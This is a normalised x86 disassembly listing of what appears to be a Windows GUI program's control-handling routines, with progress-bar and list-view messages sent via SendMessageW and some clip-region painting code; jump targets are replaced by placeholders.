or edx [ ecx * 4 + rw-data ]
or eax edx
movzx edx [ ebx + 0x261 ]
or eax [ edx * 4 + rw-data ]
or eax 0x40
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ esi + 0x24 ] eax
cmp [ ebx + 0x270 ] 0x0
jne r-xdata
cmp [ ebx + 0x284 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x20
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x100
sub_4a6494
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x400
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov [ ebx + 0x280 ] eax
mov eax ebx
mov si 0xffb0
call sub_4483f8
xor eax eax
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4a64d4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x400
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov [ ebx + 0x280 ] eax
mov eax ebx
mov si 0xffb0
call sub_4483f8
xor eax eax
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4a6514
push ebx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax [ ebx + 0x26c ]
pop ebx
retn
push 0x0
push 0x0
push 0x41c
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_4a6544
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x260 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x260 ] dl
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax ebx
call sub_492ec4
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x88 ]
sub_4a6598
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4a6701
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi edi
jle r-xdata
cmp esi [ ebp - 0x4 ]
jle r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx ]
call sub_448088
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov [ ebp - 0x4 ] esi
mov eax edi
sub eax esi
cmp eax 0x2710
setg al
mov edx [ ebx + 0x278 ]
sub edx [ ebx + 0x274 ]
cmp edx 0x2710
setg dl
cmp al dl
je r-xdata
mov [ ebp - 0x4 ] edi
cmp esi [ ebx + 0x274 ]
je r-xdata
mov [ ebx + 0x274 ] esi
mov [ ebx + 0x278 ] edi
mov eax ebx
call sub_492ec4
cmp edi [ ebx + 0x278 ]
je r-xdata
mov [ ebx + 0x274 ] esi
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax [ ebx + 0x280 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ ebx + 0x278 ] edi
mov eax ebx
call sub_496c14
test al al
je r-xdata
push esi
push 0x1
push 0x407
mov eax ebx
call sub_496868
push eax
call SendMessageW
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a6708
lea eax [ ebp - 0x14 ]
mov edx 0x2
call j_sub_44936c
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x280 ] eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
push edi
push 0x1
push 0x408
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov eax ebx
mov si 0xffb0
call sub_4483f8
mov eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x405
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_4a675c
push ebx
mov ebx eax
cmp edx [ ebx + 0x27c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x27c ] edx
mov eax ebx
call sub_496c14
test al al
je r-xdata
push 0x1
mov eax [ ebx + 0x27c ]
push eax
push 0x414
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_4a67c0
push ebx
mov ebx eax
cmp edx [ ebx + 0x264 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x264 ] edx
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax [ ebx + 0x264 ]
push eax
push 0x0
push 0x417
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_4a67fc
push ebx
mov ebx eax
cmp edx [ ebx + 0x268 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax [ ebx + 0x268 ]
push eax
push 0x0
push 0x415
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_4a6854
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x26c ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x26c ] esi
mov eax ebx
call sub_496c14
test al al
je r-xdata
push 0x0
push esi
push 0x41b
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_4a68b4
push ebx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x288 ] 0x0
jne r-xdata
cmp [ ebx + 0x28c ] 0x7fff
jge r-xdata
cmp [ ebx + 0x28c ] 0x0
jne r-xdata
mov eax [ ebx + 0x288 ]
push eax
push 0x0
push 0x40b
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov eax [ ebx + 0x28c ]
push eax
push 0x1
push 0x40c
mov eax ebx
call sub_496868
push eax
call SendMessageW
movzx eax [ ebx + 0x288 ]
movzx edx [ ebx + 0x28c ]
shl edx 0x10
or eax edx
push eax
push 0x1
push 0x40a
mov eax ebx
call sub_496868
push eax
call SendMessageW
jmp r-xdata
push 0x0
push 0x1
push 0x413
mov eax ebx
call sub_496868
push eax
call SendMessageW
jmp r-xdata
sub_4a69a8
push ebx
push esi
push edi
push ebp
add esp 0xffffffd0
mov edi edx
mov ebx eax
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ edi + 0x8 ]
cmp [ eax + 0x8 ] 0xfffffff4
jne r-xdata
add esp 0x30
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp eax
mov eax [ ebp + 0xc ]
dec eax
je r-xdata
mov [ edi + 0xc ] 0x20
jmp r-xdata
sub eax 0x10000
je r-xdata
mov eax [ ebp + 0x24 ]
dec eax
je r-xdata
jmp r-xdata
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
mov si 0xffb3
call sub_4483f8
test al al
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
mov [ edi + 0xc ] eax
jmp r-xdata
push 0x0
push 0x0
lea eax [ esp + 0xc ]
push eax
mov eax ebx
call sub_496868
push eax
call sub_44c2c8
mov ecx [ ebp + 0x10 ]
pop edx
call sub_44c5d0
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0x129
mov eax ebx
call sub_48f2b0
test al 0x1
jne r-xdata
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov eax ebx
call sub_496868
xor ecx ecx
mov edx 0x419
call sub_41f0f4
xor eax eax
mov [ esp ] eax
mov eax ebx
mov si 0xffb3
call sub_4483f8
test al al
je r-xdata
jmp r-xdata
xor eax eax
mov [ edi + 0xc ] eax
jmp r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ esp + 0xc ]
push eax
call InflateRect
cmp [ ebx + 0x260 ] 0x0
jne r-xdata
inc [ esp ]
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x24 ]
add eax [ esp ]
mov [ esp + 0x8 ] eax
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x2c ]
sub eax [ esp ]
mov [ esp + 0x10 ] eax
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x20 ]
add eax [ esp ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x28 ]
sub eax [ esp ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
call CreateRectRgn
mov esi eax
push esi
mov eax [ ebp + 0x10 ]
push eax
call SelectClipRgn
call sub_44c2c8
lea ecx [ esp + 0x14 ]
mov dl 0x22
call sub_44c9b4
lea eax [ esp + 0x14 ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_496868
push eax
call sub_44c2c8
mov ecx [ ebp + 0x10 ]
pop edx
call sub_44c5ec
push esi
call DeleteObject
push 0x0
mov eax [ ebp + 0x10 ]
push eax
call SelectClipRgn
sub_4a6b7c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_494888
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
mov si 0xffb3
call sub_4483f8
test al al
je r-xdata
push 0x0
push 0x0
lea eax [ esp + 0x8 ]
push eax
mov eax ebx
call sub_496868
push eax
call sub_44c2c8
mov ecx [ edi + 0x4 ]
pop edx
call sub_44c5d0
mov [ edi + 0xc ] 0x1
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0x129
mov eax ebx
call sub_48f2b0
test al 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
lea eax [ esp + 0x8 ]
push eax
call InflateRect
sub_4a6c08
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a6c40
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov eax [ ebp - 0x4 ]
call sub_44b160
xor eax eax
push ebp
push sub_4a6c8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a6c92
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
sub_4a6c9c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov eax [ ebp - 0x4 ]
call sub_44b160
xor eax eax
push ebp
push sub_4a6ce7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a6cee
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
sub_4a6cf8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax esi
call sub_4254d8
mov [ ebx + 0x28 ] eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_4250f4
mov [ ebx + 0x24 ] 0x32
mov [ ebx + 0xc ] 0x0
or eax 0xffffffff
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x24 ] 0x3
xor edx edx
mov [ ebp - 0x20 ] edx
mov edx [ ebx + 0x24 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] eax
mov edi esi
mov eax edi
call sub_4a7360
call sub_496c14
test al al
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax edi
call sub_4a7360
call sub_496868
mov esi eax
mov eax ebx
call sub_425180
lea edx [ ebp - 0x24 ]
push edx
push eax
push 0x1061
push esi
call SendMessageW
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a6da8
push ebx
push esi
push edi
push ebp
push ecx
call sub_44873c
mov [ esp ] dl
mov ebp eax
mov edi [ ebp + 0x4 ]
mov esi edi
mov eax edi
call sub_4a7360
call sub_496c14
test al al
je r-xdata
movzx edx [ esp ]
and dl 0xfc
mov eax ebp
call sub_42512c
mov eax esi
call sub_4a739c
cmp [ esp ] 0x0
jle r-xdata
mov eax [ ebp + 0x4 ]
call sub_4a7360
call sub_496868
mov edi eax
mov eax ebp
call sub_425180
mov ebx eax
push 0x0
push ebx
push 0x101c
push edi
call SendMessageW
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4486e4
sub_4a6e1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_424e98
push ebx
push r-xdata
push ebx
push sub_4a6e98
cmp [ ebx + 0x24 ] 0xffffffff
setle cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_4a6e57
dec [ ecx ]
add [ eax ] al
add [ edi ] dl
imul eax [ eax ] 0x740064
push 0x79005400
add [ eax ] dh
add [ gs : eax ] al
add [ ebx + 0x56 ] dl
mov ebx edx
mov esi eax
mov eax ebx
call sub_4297c4
mov eax ebx
call sub_429714
mov edx eax
mov eax esi
call sub_4a71a8
mov eax ebx
call sub_4297cc
pop esi
pop ebx
retn
sub_4a6e98
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_42bc4c
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_42bb80
mov eax ebx
call sub_42bc54
pop esi
pop ebx
retn
sub_4a6ebc
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4a7360
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_496c14
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2e9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2a8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_4272f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2a8 ] eax
jmp r-xdata
push 0x400
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x2a8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d50
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4a6fa2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_42b3e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4481b0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2a8 ]
call sub_427294
retn
sub_4a6fb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4254d8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4254d8
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_42515c
push ebp
call sub_4a6ebc
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4254e0
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_4a701a
cmp dl [ esp + ecx * 2 + 0x69 ]
jae r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4254e0
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec edi
jne r-xdata
inc ebx
outsd
insb
jne r-xdata
mov eax [ esi + 0x4 ]
call sub_4a7360
call sub_496868
mov ebx eax
mov eax [ esi + 0x4 ]
call sub_4254d8
mov esi eax
mov eax [ ebp - 0x4 ]
push eax
push esi
push 0x103a
push ebx
call SendMessageW
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a70f7
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
xor ebx ebx
outsb
cmp dh [ cs : ecx ]
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
insb
push esi
inc esp
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add al ch
mov al 0xf7
insb
jae r-xdata
inc ebx
xor esi esi
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_4a70f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42528c
mov eax [ esi + 0x4 ]
call sub_4254d8
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ esi + 0x4 ]
call sub_4254d8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4254d8
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_42515c
push ebp
call sub_4a6ebc
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
dec ebx
jne r-xdata
inc edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4254e0
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_4a7100
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx esi
call j_sub_44a294
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_449d2c
mov eax ebx
call sub_4a6fb8
sub_4a7128
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4a7360
call sub_496868
mov esi eax
mov eax ebx
call sub_425180
push 0x0
push eax
push 0x101d
push esi
call SendMessageW
mov [ ebx + 0x24 ] eax
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_4a7360
call sub_496c14
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4a7360
cmp [ eax + 0x26d ] 0x3
jne r-xdata
cmp [ ebx + 0x24 ] 0xffffffff
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4a7360
call sub_4aa880
test al al
je r-xdata
sub_4a71a8
cmp edx [ eax + 0x24 ]
je r-xdata
retn
mov ecx [ eax + 0x18 ]
cmp edx ecx
jge r-xdata
mov ecx [ eax + 0x14 ]
test ecx ecx
jle r-xdata
test edx edx
jl r-xdata
mov [ eax + 0x24 ] edx
call sub_4a6fb8
cmp ecx edx
jge r-xdata
mov edx ecx
jmp r-xdata
mov edx ecx
sub_4a71d4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_425180
test eax eax
je r-xdata
mov [ esi + 0xc ] bl
xor edx edx
mov eax esi
call sub_42515c
mov eax [ esi + 0x4 ]
call sub_4a7360
mov edx [ eax ]
call [ edx + 0x84 ]
sub_4a720c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0xd ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xd ] dl
mov eax [ ebx + 0x4 ]
call sub_4a7360
test eax eax
je r-xdata
mov eax ebx
call sub_4a6fb8
mov eax [ ebx + 0x4 ]
call sub_4a7360
mov si 0xffee
call sub_4483f8
sub_4a7270
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_424dc0
pop esi
pop ebx
retn
movzx edx [ esi + 0xc ]
mov eax ebx
call sub_4a71d4
movzx edx [ esi + 0xd ]
mov eax ebx
call sub_4a720c
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_4a7100
mov edx [ esi + 0x1c ]
mov eax ebx
call sub_4a7240
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_4a7250
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_4a7260
mov eax esi
call sub_4a7128
mov edx eax
mov eax ebx
call sub_4a71a8
pop esi
pop ebx
retn
sub_4a72e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_449d2c
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_425198
sub_4a7308
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_4252bc
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a7368
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_4a7360
call sub_4ac874
pop esi
pop ebx
retn
mov eax esi
call sub_425180
push eax
mov eax ebx
call sub_4a7360
pop edx
call sub_4acce8
pop esi
pop ebx
retn
sub_4a739c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4a7360
call sub_496c14
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_4a7484
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4254d8
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4254d8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4a7360
call sub_496868
mov esi eax
push 0x0
push ebx
push 0x101c
push esi
call SendMessageW
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4a7360
call sub_4ac874
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc esi
xor ebx ebx
mov [ edi ] 0x3
xor eax eax
mov [ edi + 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4a734c
mov eax [ eax + 0x24 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4a7360
call sub_496868
push edi
push ebx
push 0x1061
push eax
call SendMessageW
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4a734c
mov [ eax + 0x28 ] ebx
inc ebx
dec esi
jne r-xdata
sub_4a7494
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4250f4
mov [ esi + 0x20 ] 0xff000008
lea eax [ esi + 0x1c ]
xor edx edx
call sub_449d2c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a74f0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_449d2c
mov dl 0x1
mov eax ebx
call sub_42515c
pop esi
pop ebx
retn
sub_4a752b
inc [ eax ]
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
lea esi [ eax + 0xc ]
lea edi [ ecx + edx * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
inc ebx
dec esi
jne r-xdata
insb
jae r-xdata
mov edx ebx
mov eax edi
call sub_4a7614
mov edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
push esi
push edi
mov eax [ ebp - 0x8 ]
call sub_496868
mov ebx eax
mov eax edi
call sub_4254d8
mov esi eax
mov eax [ ebp - 0x4 ]
push eax
push esi
push 0x1041
push ebx
call SendMessageW
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
jmp [ edi + ecx * 4 + 0x5 ]
nop
nop
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xffff
call sub_4483f8
mov [ ebp - 0x8 ] eax
mov eax edi
call sub_4254d8
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax edi
call sub_4254d8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
sub_4a7758
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_42723c
mov [ edi + 0x48 ] esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ edi + 0x4c ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a77a4
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4c ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4269e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4a77d4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_426a68
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x4c ]
call sub_424590
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_4a7908
mov eax esi
pop esi
pop ebx
retn
sub_4a77fc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_426a78
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x4c ]
call sub_424590
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_4a7908
mov eax esi
pop esi
pop ebx
retn
sub_4a7838
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_426b7c
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4245dc
mov eax [ ebx + 0x48 ]
call sub_4a7b9c
pop esi
pop ebx
retn
sub_4a7868
push ebx
push esi
mov esi edx
mov eax [ eax + 0x48 ]
call sub_4a7a40
mov ebx eax
mov eax ebx
call sub_4aa874
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x29c ]
call sub_4254d8
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_4ac52c
cmp [ eax + 0x24 ] 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_4acce8
sub_4a78ac
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_426dd4
or ecx 0xffffffff
mov edx ebx
mov eax [ esi + 0x4c ]
call sub_424768
lea edi [ ebx + 0x1 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx edi
mov eax esi
call sub_4a7908
inc edi
dec ebx
jne r-xdata
sub_4a78ec
push ebx
push esi
mov esi edx
mov ebx eax
